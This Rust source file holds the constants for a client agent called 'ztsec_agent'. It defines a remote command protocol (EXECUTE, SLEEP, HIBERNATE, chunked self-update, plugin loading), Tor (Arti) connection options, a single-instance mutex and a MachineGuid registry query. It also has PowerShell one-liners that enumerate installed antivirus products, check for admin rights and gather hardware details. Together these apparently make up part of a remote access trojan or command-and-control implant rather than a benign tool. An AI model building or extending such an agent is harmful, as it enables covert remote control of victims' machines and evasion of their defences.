pub const VERSION: &str = "Rust-Native/1";
pub const TAG: &str = "ZTSecurity";
pub const HOST: &str = "127.0.0.1";
pub const PORT: u16 = 4793;
pub const RETRY: u64 = 5;
pub const READ: u64 = 3;

pub const IP: &str = "--ip";
pub const PORT_ARG: &str = "--port";
pub const HELP: &str = "--help";
pub const SHORT_HELP: &str = "-h";
pub const USAGE: &str = "ztsec_agent [--endpoint WS_URL] [--auth-key-file PATH] [--arti-state-dir DIR] [--arti-cache-dir DIR] [--ip IP] [--port PORT] [--print-fingerprint]";

pub const HELLO: &str = "HELLO:FINGERPRINT:";
pub const DATA: &str = "DATA:";
pub const HB: &str = "HB";
pub const PONG: &str = "PONG";
pub const REQ: &str = "REQ:DATA";
pub const CMD: &str = "CMD:";
pub const ACK: &str = "ACK:";
pub const ERR: &str = "ERR:";
pub const PLUGIN: &str = "PLUGIN:";
pub const PLUGOUT: &str = "PLUGIN_OUT:";
pub const PEVENT: &str = "PLUGIN_EVENT:";
pub const PMSG: &str = "PLUGIN_MSG:";
pub const PBEGIN: &str = "PLUGIN_BEGIN:";
pub const PCHUNK: &str = "PLUGIN_CHUNK:";
pub const PEND: &str = "PLUGIN_END:";
pub const PRESUME: &str = "PLUGIN_RESUME:";

pub const SLEEP: &str = "SLEEP";
pub const HIBERNATE: &str = "HIBERNATE";
pub const RESTART: &str = "RESTART";
pub const SHUTDOWN: &str = "SHUTDOWN";
pub const RECONNECT: &str = "RECONNECT";
pub const CLOSE: &str = "CLOSE";
pub const EXECUTE: &str = "EXECUTE:";
pub const UPDATE: &str = "UPDATE:";
pub const UPDATE_BEGIN: &str = "UPDATE_BEGIN:";
pub const UPDATE_CHUNK: &str = "UPDATE_CHUNK:";
pub const UPDATE_END: &str = "UPDATE_END:";

pub const CONNECTED: &str = "connected";
pub const RETRYING: &str = "retrying in 5s";
pub const CLOSED: &str = "closed";
pub const FAILED: &str = "failed";
#[cfg(windows)]
pub const PLUG_ERR_NAME: &str = "invalid plugin name";
#[cfg(windows)]
pub const PLUG_ERR_LOAD: &str = "plugin load failed";
#[cfg(windows)]
pub const PLUG_ERR_ENTRY: &str = "plugin entrypoints missing";
#[cfg(windows)]
pub const PLUG_ERR_INIT: &str = "plugin init failed";

#[cfg(windows)]
pub const MUTEX: &str = r"\BaseNamedObjects\ZTSecurity.ztsec_agent";
#[cfg(windows)]
pub const REG: &str = "reg";
#[cfg(windows)]
pub const REG_QUERY: &str = "query";
#[cfg(windows)]
pub const REG_VALUE: &str = "/v";
#[cfg(windows)]
pub const REG_QUERY_KEY: &str = "MachineGuid";
#[cfg(windows)]
pub const REG_64: &str = r"HKLM\SOFTWARE\Microsoft\Cryptography";

#[cfg(windows)]
pub const PS: &str = "powershell";
#[cfg(windows)]
pub const PS_ARG: [&str; 3] = ["-NoProfile", "-NonInteractive", "-Command"];
pub const RAM: &str = "$m=Get-CimInstance Win32_OperatingSystem; [math]::Round(($m.TotalVisibleMemorySize-$m.FreePhysicalMemory)/1MB,1).ToString()+'/'+[math]::Round($m.TotalVisibleMemorySize/1MB,1).ToString()+' GB'";
pub const GPU: &str = "(Get-CimInstance Win32_VideoController | Where-Object {$_.Name} | Select-Object -Expand Name) -join '; '";
pub const AV: &str = "(Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct | Where-Object {$_.displayName} | Select-Object -Expand displayName) -join '; '";
pub const OS: &str = r#"(Get-CimInstance Win32_OperatingSystem).Caption -replace '^Microsoft\s+', ''"#;
pub const PRIV: &str = "if(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)){'Admin'}else{'User'}";
